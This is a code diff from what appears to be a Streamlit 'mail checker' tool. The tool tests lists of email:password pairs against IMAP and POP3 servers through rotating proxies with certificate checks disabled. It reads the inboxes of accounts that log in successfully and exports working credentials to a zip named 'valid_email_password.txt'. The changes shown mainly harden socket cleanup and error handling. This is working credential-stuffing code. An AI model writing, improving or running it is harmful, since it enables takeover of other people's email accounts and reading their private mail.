-    mail._debugging = 0
-    mail.user(email.strip())
-    mail.pass_(password.strip())
+    raw = None
+    ssock = None
+    mail = None
     try:
-        mail.noop()
-    except Exception:
-        pass
-    mail.quit()
+        raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
+        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        ssock = ssl_wrap(raw, server, insecure=insecure)
+        mail = poplib.POP3_SSL(server, timeout=CFG["TIMEOUT"])
+        mail.sock = ssock
+        mail._debugging = 0
+        mail.user(email.strip())
+        mail.pass_(password.strip())
+        try:
+            mail.noop()
+        except Exception:
+            pass
+        try:
+            mail.quit()
+        except Exception:
+            pass
+    except Exception as e:
+        if mail:
+            try:
+                mail.quit()
+            except Exception:
+                pass
+        if raw and not ssock:
+            try: 
+                raw.shutdown(socket.SHUT_RDWR)
+            except Exception: 
+                pass
+            try: 
+                raw.close()
+            except Exception: 
+                pass
+        raise e
 
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     for h in hosts:
         try:
             class PIMAPVerify(imaplib.IMAP4_SSL):
                 def open(self, host="", port=993, timeout=None):
-                    raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=10)
-                    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                    self.sock = ssl_wrap(raw, host, insecure=True)
+                    raw = None
+                    try:
+                        raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=10)
+                        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                        self.sock = ssl_wrap(raw, host, insecure=True)
+                    except Exception as ex:
+                        if raw:
+                            try: 
+                                raw.shutdown(socket.SHUT_RDWR)
+                            except Exception: 
+                                pass
+                            try: 
+                                raw.close()
+                            except Exception: 
+                                pass
+                        raise ex
             mail = PIMAPVerify(h, timeout=10)
             mail.login(target_email.strip(), target_pass.strip())
             return True, mail, h
         except Exception:
+            raw_conn = None
             try:
                 raw_conn = proxy_connect(h, 143, proxy_str) if proxy_str else socket.create_connection((h, 143), timeout=10)
                 raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
@@ -1043,10 +1245,20 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                 mail.login(target_email.strip(), target_pass.strip())
                 return True, mail, h
             except Exception:
+                if raw_conn:
+                    try: 
+                        raw_conn.shutdown(socket.SHUT_RDWR)
+                    except Exception: 
+                        pass
+                    try: 
+                        raw_conn.close()
+                    except Exception: 
+                        pass
                 continue
     return False, None, ""
 
 def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
+    mail = None
     try:
         conf_hosts = get_servers(email).get("imap", [server])
         verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
@@ -1070,9 +1282,17 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
             mail.noop()
         except Exception:
             pass
-        mail.logout()
+        try:
+            mail.logout()
+        except Exception:
+            pass
         return messages if messages else ["No recent messages found."]
     except Exception as e:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
         return [f"Error reading mailbox: {str(e)}"]
 
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
@@ -1153,6 +1373,7 @@ with col_action2:
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
+    log_startup("Live checking engine execution triggered by user.")
     if not clean_lines:
         str_lit.warning("⚠ Please load and filter accounts first.")
     else:
@@ -1276,7 +1497,6 @@ if start_engine_btn:
                                 current_logs = list(str_lit.session_state.log_lines)
                                 current_reports = list(str_lit.session_state.report_entries)
 
-                            # Yield thread execution time to flush UI updates smoothly
                             time.sleep(0.01)
 
                             if index % 1 == 0 or checked_count == total_accs:
@@ -1319,6 +1539,7 @@ if start_engine_btn:
 
         progress_bar.progress(1.0, text="Checking complete!")
         status_text.success("🎉 Check Complete!")
+        log_startup("Live checking engine execution completed successfully.")
         
         try:
             stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -1327,44 +1548,63 @@ if start_engine_btn:
             need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
             failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
 
+            try:
+                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
+            except OSError as dir_err:
+                warnings.warn(f"Filesystem permission/creation error: {dir_err}")
+
             with file_write_lock:
-                with open(valid_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in valid_snapshot) + ("\n" if valid_snapshot else ""))
-                with open(wrong_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in wrong_snapshot) + ("\n" if wrong_snapshot else ""))
-                with open(need_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in need_snapshot) + ("\n" if need_snapshot else ""))
-                with open(failed_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in conn_snapshot) + ("\n" if conn_snapshot else ""))
+                try:
+                    with open(valid_path, "w", encoding="utf-8") as f:
+                        f.write("\n".join(str(item) for item in valid_snapshot) + ("\n" if valid_snapshot else ""))
+                    with open(wrong_path, "w", encoding="utf-8") as f:
+                        f.write("\n".join(str(item) for item in wrong_snapshot) + ("\n" if wrong_snapshot else ""))
+                    with open(need_path, "w", encoding="utf-8") as f:
+                        f.write("\n".join(str(item) for item in need_snapshot) + ("\n" if need_snapshot else ""))
+                    with open(failed_path, "w", encoding="utf-8") as f:
+                        f.write("\n".join(str(item) for item in conn_snapshot) + ("\n" if conn_snapshot else ""))
+                except IOError as io_err:
+                    warnings.warn(f"Disk-write error saving result logs: {io_err}")
 
             clean_valid_path = "clean_valid_accounts.txt"
             temp_clean_count = 0
             with file_write_lock:
-                with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                    for line in valid_snapshot:
-                        try:
-                            if ":" in line:
-                                email, remainder = line.split(":", 1)
-                                email = email.strip()
-                                password_part = remainder.split("|")[0].strip()
-                                outfile.write(f"{email}:{password_part}\n")
-                                temp_clean_count += 1
-                        except Exception:
-                            continue
+                try:
+                    with open(clean_valid_path, "w", encoding="utf-8") as outfile:
+                        for line in valid_snapshot:
+                            try:
+                                if ":" in line:
+                                    email, remainder = line.split(":", 1)
+                                    email = email.strip()
+                                    password_part = remainder.split("|")[0].strip()
+                                    outfile.write(f"{email}:{password_part}\n")
+                                    temp_clean_count += 1
+                            except Exception:
+                                continue
+                except IOError as io_err:
+                    warnings.warn(f"Disk-write error saving clean valid accounts: {io_err}")
 
             zip_output_name = f"mail_results_{stamp}.zip"
-            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
-                if os.path.exists(clean_valid_path):
-                    z.write(clean_valid_path, arcname="valid_email_password.txt")
-                if os.path.exists(wrong_path):
-                    z.write(wrong_path, arcname=os.path.basename(wrong_path))
-                if os.path.exists(need_path):
-                    z.write(need_path, arcname=os.path.basename(need_path))
-                if os.path.exists(failed_path):
-                    z.write(failed_path, arcname=os.path.basename(failed_path))
+            try:
+                with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
+                    if os.path.exists(clean_valid_path):
+                        z.write(clean_valid_path, arcname="valid_email_password.txt")
+                    if os.path.exists(wrong_path):
+                        z.write(wrong_path, arcname=os.path.basename(wrong_path))
+                    if os.path.exists(need_path):
+                        z.write(need_path, arcname=os.path.basename(need_path))
+                    if os.path.exists(failed_path):
+                        z.write(failed_path, arcname=os.path.basename(failed_path))
+            except (zipfile.BadZipFile, IOError, OSError) as zip_err:
+                warnings.warn(f"Temporary ZIP archive compilation error: {zip_err}")
 
-            with open(zip_output_name, "rb") as fp:
-                zip_bytes_data = fp.read()
+            zip_bytes_data = b""
+            if os.path.exists(zip_output_name):
+                try:
+                    with open(zip_output_name, "rb") as fp:
+                        zip_bytes_data = fp.read()
+                except IOError as fp_err:
+                    warnings.warn(f"Failed to read compiled ZIP archive: {fp_err}")
 
             with session_state_lock:
                 str_lit.session_state.clean_valid_count = temp_clean_count
